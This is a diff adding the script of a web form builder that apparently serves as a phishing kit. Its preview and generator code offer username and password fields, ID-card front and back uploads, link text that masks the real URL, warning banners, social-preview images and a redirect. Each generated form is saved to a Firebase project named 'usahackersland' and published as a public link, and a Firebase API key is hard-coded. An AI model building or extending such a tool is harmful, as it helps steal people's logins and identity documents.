+        <option value="center" ${line.align==="center"?"selected":""}>Center</option>
+        <option value="right" ${line.align==="right"?"selected":""}>Right</option>
+      </select>
+
+      <button
+        style="margin-top:6px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="draggableItems.splice(${i},1); renderLinesList(); renderPreview()">
+        ❌ Delete Line
+      </button>
+    `;
+
+    wrap.appendChild(row);
+  });
+}
+
+function renderSimpleGallery() {
+  const txt = $("galleryImages")?.value || "";
+  const urls = txt.split("\n").map(v => v.trim()).filter(Boolean);
+  if (!urls.length) return null;
+
+  const wrap = document.createElement("div");
+  wrap.style.margin = "12px 0";
+    const layout = $("galleryItemsLayout")?.value;
+
+wrap.style.display =
+  layout === "list" ? "block" :
+  layout === "mix"  ? "grid"  :
+  "grid";
+  wrap.style.gap = "10px";
+
+  if ($("galleryLayout")?.value !== "list") {
+    wrap.style.gridTemplateColumns =
+      $("galleryLayout")?.value === "large-grid"
+        ? "repeat(auto-fit, minmax(220px,1fr))"
+        : "repeat(auto-fit, minmax(140px,1fr))";
+  }
+
+  urls.forEach(src => {
+    const img = document.createElement("img");
+    img.src = src;
+    img.style.width = "100%";
+    img.style.borderRadius = "8px";
+    wrap.appendChild(img);
+  });
+
+  return wrap;
+}
+
+function renderGalleryItems() {
+  if (!galleryItems.length) return null;
+
+  const wrap = document.createElement("div");
+  wrap.style.margin = "14px 0";
+  wrap.style.display =
+    $("galleryItemsLayout")?.value?.includes("grid") ? "grid" : "block";
+  wrap.style.gap = "12px";
+
+  if ($("galleryItemsLayout")?.value?.includes("grid")) {
+    wrap.style.gridTemplateColumns =
+      $("galleryItemsLayout")?.value === "large-grid"
+        ? "repeat(auto-fit, minmax(220px,1fr))"
+        : "repeat(auto-fit, minmax(140px,1fr))";
+  }
+
+  galleryItems.forEach(item => {
+    const card = document.createElement("div");
+    card.style.border = "1px solid #ddd";
+    card.style.borderRadius = "8px";
+    card.style.padding = "8px";
+    card.style.background = "#fff";
+
+    if (item.img) {
+      const img = document.createElement("img");
+      img.src = item.img;
+      img.style.width = "100%";
+      img.style.borderRadius = "6px";
+      card.appendChild(img);
+    }
+
+    if (item.desc) {
+      const p = document.createElement("p");
+      p.textContent = item.desc;
+      card.appendChild(p);
+    }
+
+    if (item.link && item.mask) {
+      const a = document.createElement("a");
+      a.href = item.link;
+      a.textContent = item.mask;
+      a.target = "_blank";
+      a.style.fontWeight = "600";
+      card.appendChild(a);
+    }
+
+    wrap.appendChild(card);
+  });
+
+  return wrap;
+}
+
+/* =========================
+ 🔥  Render Preview
+========================= */
+function renderPreview() {
+  try {
+    const p = $("preview");
+    if (!p) return;
+    p.innerHTML = "";
+    p.style.position = "relative";
+
+    // Main container
+    const c = document.createElement("div");
+    const fDiv = document.createElement("form");
+ fDiv.className = "preview-form";
+    c.style.position = "relative";
+    c.style.zIndex = 2;
+    c.style.width = "100%";
+    c.style.padding = "16px";
+    c.style.color = $("textColor")?.value || "#222";
+    c.style.backgroundColor = $("bgColor")?.value || "#fff";
+
+    // -------------------------
+// Background image
+// -------------------------
+if ($("enableBackground")?.checked) {
+  const bgImg = uploadedBgImageURL || $("bgImageURL")?.value;
+  if (bgImg) {
+    c.style.backgroundImage = `url(${bgImg})`;
+    c.style.backgroundSize = $("bgSize")?.value || "cover";
+    c.style.backgroundRepeat = "no-repeat";
+    c.style.backgroundPosition = "center";
+  }
+}
+
+// -------------------------
+// Background video
+// -------------------------
+const backgroundEnabled = $("enableBackground")?.checked;
+
+if (backgroundEnabled) {
+  const bgVideoSource =
+    uploadedBgVideoURL || $("bgVideoURL")?.value?.trim();
+
+  if (bgVideoSource) {
+    // Create background video element
+    const video = document.createElement("video");
+video.src = bgVideoSource;
+video.autoplay = true;
+video.muted = true;      // required for autoplay
+video.loop = true;
+video.playsInline = true;
+
+// ✅ ADD THESE LINES
+video.setAttribute("playsinline", "");
+video.setAttribute("webkit-playsinline", "");
+video.preload = "auto";
+
+video.className = "bg-video";
+
+    // Append video to preview container
+    p.appendChild(video);
+
+    // Create overlay for darkening / styling
+    const overlay = document.createElement("div");
+    overlay.className = "bg-overlay";
+    p.appendChild(overlay);
+  }
+}
+
+    // Avatar / Logo / Banner helper
+    const addImage = (id, width, round = false, margin = "auto") => {
+      const url = $(id)?.value;
+      if (!url) return;
+      const img = document.createElement("img");
+      img.src = url;
+      img.style.width = width;
+      if (round) img.style.borderRadius = "50%";
+      img.style.display = "block";
+      img.style.margin = margin;
+      c.appendChild(img);
+    };
+    addImage("avatarURL", "90px", true);
+    addImage("logoURL", "140px");
+    addImage("bannerURL", "100%", false, "10px auto");
+
+    // Title
+const titleEl = document.createElement("h2");
+titleEl.textContent = $("title")?.value || "";
+titleEl.style.textAlign = "center";
+titleEl.style.color = $("titleColor")?.value || "#000";
+titleEl.style.fontSize = ($("titleSize")?.value || 32) + "px"; // ✅ ADD
+c.appendChild(titleEl);
+
+// Subtitle
+const subtitleEl = document.createElement("p");
+subtitleEl.textContent = $("subtitle")?.value || "";
+subtitleEl.style.textAlign = "center";
+subtitleEl.style.color = $("subtitleColor")?.value || "#555";
+c.appendChild(subtitleEl);
+
+// Render Simple Gallery (Images Only)
+    const simpleGalleryWrap = renderSimpleGallery();
+if (simpleGalleryWrap) c.appendChild(simpleGalleryWrap);
+
+// Description
+const descEl = document.createElement("p");
+descEl.textContent = $("description")?.value || "";
+c.appendChild(descEl); 
+
+    // Render gallery items (image + masked link)
+    
+const galleryItemsWrap = renderGalleryItems();
+if (galleryItemsWrap) c.appendChild(galleryItemsWrap);
+
+   // -----------------------
+// Form fields container
+// ----------------------- // ✅ define fDiv at the top
+fDiv.style.display = "flex";
+fDiv.style.flexDirection = "column";
+fDiv.style.gap = "8px";
+
+// Auth fields
+if ($("addAuth")?.checked) {
+  const userInput = document.createElement("input");
+  userInput.placeholder = $("usernamePlaceholder")?.value || "Username";
+  fDiv.appendChild(userInput);
+
+  const passInput = document.createElement("input");
+  passInput.type = "password";
+  passInput.placeholder = $("passwordPlaceholder")?.value || "Password";
+  fDiv.appendChild(passInput);
+}
+
+// Extra fields
+($("extraFields")?.value || "")
+  .split("\n")
+  .map(v => v.trim())
+  .filter(Boolean)
+  .forEach(f => {
+  const input = document.createElement("input");
+  input.placeholder = f;
+  input.style.padding = "10px";
+  input.style.border = "1px solid #ccc";
+  input.style.borderRadius = "6px";
+  input.style.width = "100%";
+  fDiv.appendChild(input);
+});
+
+// Custom fields
+customFields.forEach(fld => {
+  const input = document.createElement("input");
+  input.type = fld.type || "text";
+  input.placeholder = fld.label || "Field";
+  input.style.padding = "10px";
+  input.style.border = "1px solid #ccc";
+  input.style.borderRadius = "6px";
+  input.style.width = "100%";
+  fDiv.appendChild(input);
+});
+
+// ID Uploads (preview thumbnails)
+["chkIdFront","chkIdBack"].forEach(idChk=>{
+  if ($(idChk)?.checked) {
+    const box = document.createElement("div");
+    box.style.border="1px dashed #aaa";
+    box.style.borderRadius="8px";
+    box.style.padding="10px";
+    const lbl = document.createElement("label");
+    lbl.textContent = $(idChk==="chkIdFront"?"txtIdFront":"txtIdBack")?.value || "Upload";
+    box.appendChild(lbl);
+
+    const inp = document.createElement("input");
+    inp.type="file";
+    inp.disabled = true;
+
+    const url = $(idChk==="chkIdFront"?"idFrontFile":"idBackFile")?.dataset.uploadedUrl;
+    if(url){
+      const thumb = document.createElement("img");
+      thumb.src=url;
+      thumb.style.width="120px";
+      thumb.style.marginTop="6px";
+      thumb.style.borderRadius="6px";
+      box.appendChild(thumb);
+    }
+
+    box.appendChild(inp);
+    fDiv.appendChild(box);
+  }
+});
+
+// -------------------------
+// Warning message
+// -------------------------
+if ($("enableWarning")?.checked && $("warning")?.value.trim()) {
+  const warning = document.createElement("p");
+  warning.textContent = $("warning").value;
+  const pos = $("warningPosition")?.value || "center";
+  if (pos !== "none") warning.style.textAlign = pos === "normal" ? "left" : pos;
+  warning.style.color = $("warningColor")?.value || "#d32f2f"; // <-- use admin-selected color
+  warning.style.fontWeight = "600";
+  warning.style.marginBottom = "8px";
+  fDiv.appendChild(warning); // append to form container
+}
+
+// -------------------------
+// Custom submit message (optional)
+// -------------------------
+if ($("submitMessage")?.value.trim()) {
+  const msgDiv = document.createElement("div");
+  msgDiv.id = "formMessage";
+  msgDiv.textContent = ""; // Initially empty, will show on submit
+  msgDiv.style.color = $("submitMessageColor")?.value || "#1976d2"; // <-- use admin-selected color
+  msgDiv.style.fontWeight = "600";
+  msgDiv.style.textAlign = "center";
+  msgDiv.style.marginBottom = "8px";
+  c.appendChild(msgDiv); // append under the warning
+}
+
+// -------------------------
+// Main Submit button
+// -------------------------
+if ($("showMainBtn")?.checked) {
+  const btn = document.createElement("button");
+  btn.textContent = $("buttonText")?.value || "Submit";
+  btn.style.backgroundColor = $("btnColor")?.value || "#1976d2";
+  btn.style.color = "#fff";
+  btn.style.padding = "12px 20px";
+  btn.style.border = "none";
+  btn.style.borderRadius = "8px";
+  btn.style.cursor = "pointer";
+  btn.style.fontSize = "16px";
+  btn.style.marginTop = "10px";
+
+  // Align button
+  btn.style.alignSelf =
+    $("btnPosition")?.value === "left" ? "flex-start" :
+    $("btnPosition")?.value === "right" ? "flex-end" :
+    "center";
+
+  // On click, show the custom submit message typed in admin panel
+  btn.onclick = () => {
+    const msgDiv = document.getElementById("formMessage");
+    if (msgDiv && $("submitMessage")?.value.trim()) {
+      msgDiv.textContent = $("submitMessage").value;
+      // Optional: remove the message after 5 seconds
+      setTimeout(() => { msgDiv.textContent = ""; }, 5000);
+    }
+  };
+
+  fDiv.appendChild(btn);
+}
+
+// Append form container to main preview
+c.appendChild(fDiv);
+
+// -----------------------
+// Extra Buttons (LIVE PREVIEW)
+// -----------------------
+extraButtons.forEach(btn => {
+  if (!btn.show) return;
+
+  const b = document.createElement("button");
+  b.textContent = btn.text;
+  b.style.background = btn.color || "#1976d2";
+  b.style.color = "#fff";
+  b.style.fontSize = (btn.size || 44) + "px";
+  b.style.padding = "8px 12px";
+  b.style.border = "none";
+  b.style.borderRadius = "8px";
+  b.style.cursor = "pointer";
+  b.style.position = "relative"; // can be absolute if you want drag
+  b.style.alignSelf =
+    btn.align === "left" ? "flex-start" :
+    btn.align === "right" ? "flex-end" :
+    "center";
+
+  b.onclick = () => {
+    if (btn.link) window.open(btn.link, "_blank");
+  };
+
+  // Optional: draggable by admin
+  b.onmousedown = e => {
+    dragging = btn;
+    const rect = b.getBoundingClientRect();
+    dx = e.clientX - rect.left;
+    dy = e.clientY - rect.top;
+  };
+
+  fDiv.appendChild(b);
+});
+
+/* =========================
+   FOOTER
+========================= */
+const footer = document.createElement("footer");
+footer.style.textAlign = "center";
+footer.style.fontSize = "12px";
+footer.textContent = $("footerText")?.value || "";
+c.appendChild(footer);
+
+/* =========================
+   APPEND MAIN CONTENT
+========================= */
+p.appendChild(c);
+} catch (err) {
+    console.error(err);
+}
+} // <-- Close renderPreview() here
+
+// -------------------------
+// Firebase
+// -------------------------
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland",
+  storageBucket: "usahackersland.appspot.com"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+
+// Firestore
+const db = firebase.firestore();
+
+// Firebase Storage
+const storage = firebase.storage();
+
+// Upload Front ID
+$("idFrontFile").addEventListener("change", async e => {
+  const file = e.target.files[0];
+  if (!file) return;
+  const ref = storage.ref(`uploads/${Date.now()}_${file.name}`);
+  await ref.put(file);
+  const url = await ref.getDownloadURL();
+  e.target.dataset.uploadedUrl = url;
+  renderPreview();
+});
+
+// Upload Back ID
+$("idBackFile").addEventListener("change", async e => {
+  const file = e.target.files[0];
+  if (!file) return;
+  const ref = storage.ref(`uploads/${Date.now()}_${file.name}`);
+  await ref.put(file);
+  const url = await ref.getDownloadURL();
+  e.target.dataset.uploadedUrl = url;
+  renderPreview();
+});
+
+// ===============================
+// Upload Background Video (PREVIEW ONLY)
+// ===============================
+$("bgVideoUpload").addEventListener("change", e => {
+  const file = e.target.files[0];
+  if (!file) return;
+
+  // Revoke previous preview blob (builder only)
+  if (uploadedBgVideoURL?.startsWith("blob:")) {
+    URL.revokeObjectURL(uploadedBgVideoURL);
+  }
+
+  uploadedBgVideoURL = URL.createObjectURL(file);
+  renderPreview();
+});
+
+
+// ===============================
+// Upload Background Image (PREVIEW ONLY)
+// ===============================
+$("bgImageUpload").addEventListener("change", e => {
+  const file = e.target.files[0];
+  if (!file) return;
+
+  // Revoke previous preview blob (builder only)
+  if (uploadedBgImageURL?.startsWith("blob:")) {
+    URL.revokeObjectURL(uploadedBgImageURL);
+  }
+
+  uploadedBgImageURL = URL.createObjectURL(file);
+  renderPreview();
+});
+
+// 🔄 Auto live preview on ANY input or change
+document.addEventListener("input", e => {
+  if (e.target.closest(".wrap")) {
+    renderPreview();
+  }
+});
+
+// 🔤 Admin title live preview listeners
+$("title").addEventListener("input", updateAdminTitlePreview);
+$("titleSize").addEventListener("change", updateAdminTitlePreview);
+$("titleColor").addEventListener("input", updateAdminTitlePreview);
+
+async function generateForm() {
+  try {
+    console.log("Generating form...");
+
+    const frontUrl = $("idFrontFile")?.dataset.uploadedUrl || "";
+    const backUrl  = $("idBackFile")?.dataset.uploadedUrl || "";
+
+    /* =========================
+       FORM FIELDS
+    ========================= */
+    const fields = [];
+
+    if ($("addAuth")?.checked) {
+      fields.push({
+        type: "text",
+        name: "username",
+        placeholder: $("usernamePlaceholder").value
+      });
+      fields.push({
+        type: "password",
+        name: "password",
+        placeholder: $("passwordPlaceholder").value
+      });
+    }
+
+    $("extraFields").value
+  .split("\n")
+  .map(v => v.trim())
+  .filter(Boolean)
+  .forEach(f => {
+    fields.push({
+      type: "text",
+      name: f.replace(/\s+/g, "_").toLowerCase(),
+      placeholder: f
+    });
+  });
+
+    customFields.forEach(f => {
+      fields.push({
+        type: f.type,
+        name: f.label.replace(/\s+/g, "_").toLowerCase(),
+        placeholder: f.label
+      });
+    });
+
+    /* =========================
+       FINAL DATA OBJECT
+    ========================= */
+    const data = {
+      createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+
+      seo: {
+        title: $("seoTitle").value,
+        description: $("metaDesc").value,
+        ogImage: $("ogImage").value
+      },
+
+      branding: {
+        avatar: $("avatarURL").value,
+        logo: $("logoURL").value,
+        banner: $("bannerURL").value
+      },
+
+      page: {
+        title: $("title").value,
+        subtitle: $("subtitle").value,
+        description: $("description").value,
+        footer: $("footerText").value
+      },
+
+      styling: {
+        textColor: $("textColor").value,
+        bgColor: $("bgColor").value,
+        bgImage: uploadedBgImageURL || $("bgImageURL").value,
+        bgVideo: uploadedBgVideoURL || $("bgVideoURL").value,
+        buttonColor: $("btnColor").value,
+        buttonPosition: $("btnPosition").value
+      },
+
+      galleryItems,
+      embeds: embedLinks,
+      extraButtons,
+      draggableLines: draggableItems,
+
+      warning: $("enableWarning").checked ? {
+        text: $("warning").value,
+        position: $("warningPosition").value
+      } : null,
+
+      idUploads: {
+        front: frontUrl,
+        back: backUrl
+      },
+
+      redirect: $("enableRedirect").checked ? $("redirectURL").value : "",
+
+      fields
+    };
+    
+    generatedData = data;
+generatedHTML = JSON.stringify(data, null, 2);
+
+    /* =========================
+       SAVE TO FIRESTORE
+    ========================= */
+    const docRef = await db.collection("forms").add(data);
+
+    const publicLink =
+      location.origin +
+      location.pathname.replace(/\/[^\/]*$/, "") +
+      "/form.html?id=" +
+      docRef.id;
+
+    /* /* =========================
+   SHOW LINK
+========================= */
+const linkBox = $("linkArea");
+linkBox.style.display = "block";
+
+linkBox.innerHTML = `
+<strong>✅ Form Generated</strong><br><br>
+
+<input id="generatedFormLink"
+value="${publicLink}"
+style="width:100%;padding:8px"
+readonly>
+
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:10px;">
+
+<button onclick="
+navigator.clipboard.writeText(document.getElementById('generatedFormLink').value);
+alert('✅ Link copied!');
+"
+style="padding:8px 14px;border:none;border-radius:6px;background:#1976d2;color:#fff;cursor:pointer">
+📋 Copy Link
+</button>
+
+<button onclick="
+window.open(document.getElementById('generatedFormLink').value,'_blank');
+"
+style="padding:8px 14px;border:none;border-radius:6px;background:#28a745;color:#fff;cursor:pointer">
+🌍 Open Link
+</button>
+
+<button onclick="copyGeneratedHTML()"
+style="padding:8px 14px;border:none;border-radius:6px;background:#ff9800;color:#fff;cursor:pointer">
+📄 Copy HTML
+</button>
+
+</div>
+`;
+
+    console.log("Form saved:", docRef.id);
+
+  } catch (err) {
+    console.error("Generate form error:", err);
+    alert("❌ Error generating form. Check console.");
+  }
+}
+
+function copyGeneratedHTML() {
+
+    const html = generatedHTML;
+
+    navigator.clipboard.writeText(html)
+    .then(()=>{
+        alert("HTML code copied successfully.");
+    })
+    .catch(()=>{
+        alert("Unable to copy HTML.");
+    });
+
+}
+
+// =====================
+// ID UPLOAD LIVE PREVIEW
+// =====================
+$("chkIdFront").addEventListener("change", renderPreview);
+$("chkIdBack").addEventListener("change", renderPreview);
+$("txtIdFront").addEventListener("input", renderPreview);
+$("txtIdBack").addEventListener("input", renderPreview);
+
+// =====================
+// ENABLE BACKGROUND TOGGLE
+// =====================
+$("enableBackground").addEventListener("change", (e) => {
+  if (!e.target.checked) {
+    uploadedBgVideoURL = "";
+    uploadedBgImageURL = "";
+    $("bgVideoURL").value = "";
+    $("bgImageURL").value = "";
+  }
+  renderPreview();
+});
+
+// =====================
+// PAGE LOAD INITIALIZATION
+// =====================
+window.addEventListener("DOMContentLoaded", () => {
+  updateAdminTitlePreview();
+  renderGalleryInputs();
+  renderCustomFields();
+  renderPreview();
+
+  // mobile safety rerender
+  setTimeout(renderPreview, 300);
+});
+
+</script>
+</body>
+</html>
